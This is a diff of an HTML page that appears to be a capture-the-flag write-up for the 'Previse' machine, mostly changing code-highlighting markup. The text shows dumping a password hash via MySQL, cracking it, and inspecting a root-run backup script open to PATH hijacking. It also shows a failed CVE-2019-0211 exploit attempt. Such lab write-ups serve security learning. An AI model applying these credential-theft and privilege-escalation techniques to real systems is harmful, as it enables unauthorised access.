+</span></code></pre></td></tr></table>
 </div>
 </div><h2 id="shell-as-m4lwhere">Shell as m4lwhere</h2>
 <p>hashid failed to identify the salted hash:</p>
@@ -651,23 +651,23 @@ Hash: $1$_llol$DQpmdvnb7EeuO6UaqRItf.
 <li><code>--force</code> because we don&rsquo;t have a GPU</li>
 </ul>
 <p>At this stage it is a failure, and this is when I start to doubt about the password encoding or copy from my terminal. I give another try using <code>to_base64(password)</code> instead and we are successful to break the hash. Lesson is learnt.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>mysql<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">select</span> id, username, TO_BASE64(password) <span style="color:#ff79c6">from</span> accounts;
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">select</span> id, username, TO_BASE64(password) <span style="color:#ff79c6">from</span> accounts;
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#6272a4">----+----------+--------------------------------------------------+
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> id <span style="color:#ff79c6">|</span> username <span style="color:#ff79c6">|</span> TO_BASE64(password)                              <span style="color:#ff79c6">|</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+</span><span style="color:#6272a4">----+----------+--------------------------------------------------+
-</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span>  <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">|</span> m4lwhere <span style="color:#ff79c6">|</span> JDEk8J<span style="color:#ff79c6">+</span>ngmxsb2wkRFFwbWR2bmI3RWV1TzZVYXFSSXRmLg<span style="color:#ff79c6">==</span> <span style="color:#ff79c6">|</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">mysql<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">select</span> id, username, TO_BASE64(password) <span style="color:#ff79c6">from</span> accounts;
+<span style="color:#ff79c6">select</span> id, username, TO_BASE64(password) <span style="color:#ff79c6">from</span> accounts;
+<span style="color:#ff79c6">+</span><span style="color:#6272a4">----+----------+--------------------------------------------------+
+</span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> id <span style="color:#ff79c6">|</span> username <span style="color:#ff79c6">|</span> TO_BASE64(password)                              <span style="color:#ff79c6">|</span>
+<span style="color:#ff79c6">+</span><span style="color:#6272a4">----+----------+--------------------------------------------------+
+</span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span>  <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">|</span> m4lwhere <span style="color:#ff79c6">|</span> JDEk8J<span style="color:#ff79c6">+</span>ngmxsb2wkRFFwbWR2bmI3RWV1TzZVYXFSSXRmLg<span style="color:#ff79c6">==</span> <span style="color:#ff79c6">|</span>
+</code></pre></td></tr></table>
 </div>
 </div><blockquote>
 <p>Lesson Learnt: beware what you copy from or to the terminal. Use Base64 when unsure !</p>
@@ -694,29 +694,29 @@ m4lwhere@previse:~$ sudo -l
 User m4lwhere may run the following commands on previse:
 (root) /opt/scripts/access_backup.sh</p>
 <p>access_backup.sh:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#ff79c6">#!/bin/bash
-</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
-</span></span><span style="display:flex;"><span><span style="color:#6272a4"># We always make sure to store logs, we take security SERIOUSLY here</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#6272a4"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
-</span></span><span style="display:flex;"><span><span style="color:#6272a4"># This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>gzip -c /var/log/apache2/access.log &gt; /var/backups/<span style="color:#ff79c6">$(</span>date --date<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;yesterday&#34;</span> +%Y%b%d<span style="color:#ff79c6">)</span>_access.gz
-</span></span><span style="display:flex;"><span>gzip -c /var/www/file_access.log &gt; /var/backups/<span style="color:#ff79c6">$(</span>date --date<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;yesterday&#34;</span> +%Y%b%d<span style="color:#ff79c6">)</span>_file_access.gz
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#ff79c6">#!/bin/bash
+</span><span style="color:#ff79c6"></span>
+<span style="color:#6272a4"># We always make sure to store logs, we take security SERIOUSLY here</span>
+
+<span style="color:#6272a4"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
+<span style="color:#6272a4"># This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time</span>
+
+gzip -c /var/log/apache2/access.log &gt; /var/backups/<span style="color:#ff79c6">$(</span>date --date<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;yesterday&#34;</span> +%Y%b%d<span style="color:#ff79c6">)</span>_access.gz
+gzip -c /var/www/file_access.log &gt; /var/backups/<span style="color:#ff79c6">$(</span>date --date<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;yesterday&#34;</span> +%Y%b%d<span style="color:#ff79c6">)</span>_file_access.gz
+</code></pre></td></tr></table>
 </div>
 </div><p>inspect permissions:</p>
 <pre><code>m4lwhere@previse:~$ echo $PATH
@@ -824,7 +824,7 @@ Triggering UAF
   Creating DateInterval object
 UAF failed, exiting.
 </code></pre>
-<p>Reading the exploit author blog <a href="https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html">https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html</a>, it says this exploit needs to obtain R/W privileges on a worker process, and it uses a PHP UAF 0-day exploit.</p>
+<p>Reading the exploit author blog <a href="https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html,">https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html,</a> it says this exploit needs to obtain R/W privileges on a worker process, and it uses a PHP UAF 0-day exploit.</p>
 <blockquote>
 <p>Since mod_prefork is often used in combination with mod_php, it seems natural to exploit the vulnerability through PHP. <a href="https://github.com/cfreal/exploits/tree/master/CVE-2019-6977-imagecolormatch">CVE-2019-6977 (exploit)</a> would be a perfect candidate, but it was not out when I started writing the exploit. I went with a 0day UAF in PHP 7.x (which seems to work in PHP5.x as well):</p>
 </blockquote>
